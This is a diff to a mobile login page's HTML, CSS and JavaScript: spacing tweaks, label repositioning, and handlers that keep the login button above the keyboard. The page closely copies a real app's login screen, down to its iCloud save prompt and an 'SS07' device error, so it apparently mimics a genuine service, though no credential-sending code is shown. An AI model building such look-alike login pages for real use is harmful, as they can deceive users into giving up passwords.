@@ -32,7 +32,7 @@
     input[type="checkbox"]:checked::after {
       content: '';
       position: absolute;
-      left: 3px;
+      left: 1px;
       top: 0px;
       width: 5px;
       height: 10px;
@@ -47,91 +47,99 @@
     }
 
     #loginBtn {
-      transition: bottom 0.30s ease;
-      min-width: 75%;
+      transition: bottom 0.35s ease;
+      min-width: 50%;
     }
 
-    /* Main container narrower and centered */
-    .main-container {
-      width: 100%;
-      max-width: 360px; /* narrower than before */
-      margin: 0 auto;
-      padding-left: 0;
-      padding-right: 0;
-    }
-
-    /* Input containers */
+    /* Input containers slightly wider */
     .input-container {
-      width: 100%;
+      max-width: 105%;
       margin: 0 auto;
     }
 
-    /* Inputs full width inside container */
+    /* Ensure inputs fill the container */
     input[type="text"], input[type="password"] {
       width: 100%;
-      border-bottom: 1px solid #d1d5db; /* thin line */
-      font-size: 0.875rem; /* same size as labels */
-      padding-right: 2.5rem; /* for eye button */
+      border-bottom-width: 1px; /* thin line */
+      border-color: #d1d5db;
     }
 
-    /* Labels same size as inputs */
-    label {
-      font-size: 0.875rem;
+    /* Move Password label and input line */
+    label[for="password"] {
+      position: relative;
+      top: -3px;
+    }
+    #password {
+      position: relative;
+      top: -2.7px;
     }
 
-    /* Password toggle button */
-    button[aria-label="Toggle password visibility"] {
-      right: 0.25rem;
+    /* Move checkbox and text up */
+    label.inline-flex.items-center {
+      position: relative;
+      top: -2px;
+      gap: 0.5rem; /* spacing between checkbox and text */
     }
 
     /* Checkbox adjustments */
-    label.inline-flex.items-center {
-      gap: 0.5rem;
-      font-size: 0.8125rem; /* slightly smaller */
+    label.inline-flex.items-center input[type="checkbox"] {
+      margin-left: 0.25rem; /* move checkbox slightly right */
     }
 
-    /* Error message width same as inputs */
+    label.inline-flex.items-center span {
+      font-size: 0.875rem; /* slightly smaller text */
+    }
+
+    /* Move forgot password text up */
+    #forgotPassword {
+      position: relative;
+      top: -3.5px;
+    }
+
+    /* Make error message same width and size as inputs */
     #errorMsg {
-      width: 100%;
-      font-size: 0.875rem;
+      max-width: 100%; /* match input width */
+      margin: 0 auto;
+      font-size: 0.75rem; /* same as input labels text-xs */
       line-height: 1rem;
       word-wrap: break-word;
-      margin: 0 auto;
     }
 
-    /* Heading adjustments */
+    /* Adjust the Log In heading */
     h1 {
+      position: relative;
+      top: -2px;
       font-size: 1.75rem;
       font-weight: 500;
     }
   </style>
 </head>
-<body class="bg-white min-h-screen flex flex-col justify-between relative">
-  <div class="pt-4 relative flex flex-col flex-grow main-container">
+<body class="bg-white min-h-screen flex flex-col justify-between max-w-md mx-auto relative">
+  <div class="pt-4 px-6 relative flex flex-col flex-grow">
     <button aria-label="Back" class="absolute top-4 left-6 text-[#00b5e7] text-2xl leading-none font-medium">
       <i class="fas fa-chevron-left"></i>
     </button>
-    <h1 class="mt-12 mb-8 text-center text-black font-medium font-sans">Log In</h1>
+    <h1 class="mt-12 mb-8 text-center text-black text-2xl font-medium font-sans">Log In</h1>
     <form id="loginForm" class="flex flex-col space-y-6">
       <div class="flex flex-col input-container">
-        <label for="username" class="text-gray-400 tracking-widest mb-1 font-sans">USERNAME, EMAIL, OR PHONE</label>
-        <input id="username" type="text" autocomplete="username" required />
+        <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">USERNAME, EMAIL, OR PHONE</label>
+        <input id="username" type="text" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="username" required />
       </div>
       <div class="flex flex-col relative input-container">
-        <label for="password" class="text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
-        <input id="password" type="password" autocomplete="current-password" required />
-        <button type="button" aria-label="Toggle password visibility" class="absolute bottom-3 text-gray-400" onclick="togglePassword()">
+        <label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
+        <input id="password" type="password" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="current-password" required />
+        <button type="button" aria-label="Toggle password visibility" class="absolute right-0 bottom-3 text-gray-400 text-lg" onclick="togglePassword()">
           <i id="eyeIcon" class="fas fa-eye-slash"></i>
         </button>
       </div>
       <p id="errorMsg" class="text-red-500 font-normal leading-tight hidden">
         SS07: Device associated with high number of accounts. Learn more <a href="#" class="text-blue-600 underline">here</a>.
       </p>
-      <label class="inline-flex items-center font-sans text-black">
+      <label class="inline-flex items-center space-x-2 font-sans text-black input-container">
         <input type="checkbox" checked />
         <span>Save Login Info on your iCloud devices</span>
       </label>
-      <a id="forgotPassword" href="#" class="text-[#0083ff] text-center font-sans mt-2">Forgot your password?</a>
+      <a id="forgotPassword" href="#" class="text-[#0083ff] text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
     </form>
   </div>
 
@@ -186,6 +194,31 @@
           document.getElementById("eyeIcon").classList.replace("fa-eye", "fa-eye-slash");
         }
       }
+
+      function moveAboveKeyboard() {
+        const gap = 8;
+        const forgotBottom = forgotPassword.getBoundingClientRect().bottom;
+        const viewportHeight = window.innerHeight;
+        const newBottom = Math.max(viewportHeight - forgotBottom + gap - 30, 16);
+        loginBtn.style.bottom = newBottom + "px";
+      }
+
+      function resetButtonPosition() {
+        loginBtn.style.bottom = "8px";
+      }
+
+      usernameInput.addEventListener("focus", moveAboveKeyboard);
+      passwordInput.addEventListener("focus", moveAboveKeyboard);
+      usernameInput.addEventListener("blur", resetButtonPosition);
+      passwordInput.addEventListener("blur", resetButtonPosition);
+      window.addEventListener("resize", resetButtonPosition);
+
+      usernameInput.addEventListener("keydown", function(e) {
+        if(e.key === "Enter" && !loginBtn.disabled) loginBtn.click();
+      });
+      passwordInput.addEventListener("keydown", function(e) {
+        if(e.key === "Enter" && !loginBtn.disabled) loginBtn.click();
+      });
     });
   </script>
 </body>
